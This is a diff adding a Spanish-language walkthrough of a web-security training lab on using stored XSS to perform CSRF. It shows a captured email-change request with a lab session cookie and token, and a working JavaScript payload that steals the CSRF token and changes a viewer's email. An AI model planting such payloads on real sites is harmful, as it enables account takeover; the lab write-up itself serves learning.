@@ -112,3 +112,55 @@ Entonces, nos logeamos con las credenciales y completamos el laboratorio.
 
 ## 4. Lab: Exploiting XSS to perform CSRF
 
+```
+This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.
+```
+
+Antes de todo necesitamos entender como funciona el cambio de contraaeña, así que cambiaremos la contraseña de nuestra cuenta **wiener** para conocer los parametros y la ruta a donde se debe enviar.
+
+```
+POST /email/change-email HTTP/1.1
+Host: ac411fe71f8b856f80352cd100b300fe.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+Origin: https://ac411fe71f8b856f80352cd100b300fe.web-security-academy.net
+DNT: 1
+Connection: close
+Referer: https://ac411fe71f8b856f80352cd100b300fe.web-security-academy.net/email
+Cookie: session=aFgfuzayL8jK1xA5jr3j6Z1fQvH6Kbsv
+Upgrade-Insecure-Requests: 1
+
+email=a%40a.a&csrf=6f8A1jOKIzioIeAGRZayu2KCRH2q0mTf
+```
+
+Entonces, realizaremos un payload XSS con los parametros del paquete anterior:
+
+```html
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/email',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/email/change-email', true);
+    changeReq.send('csrf='+token+'&email=a@a.a')
+};
+</script>
+```
+
+Entonces lo enviamos por comentario y terminamos el laboratorio.
+
+![](img10.png)
+
+## 5. Lab: Reflected XSS into HTML context with nothing encoded
+
+
+
+
+
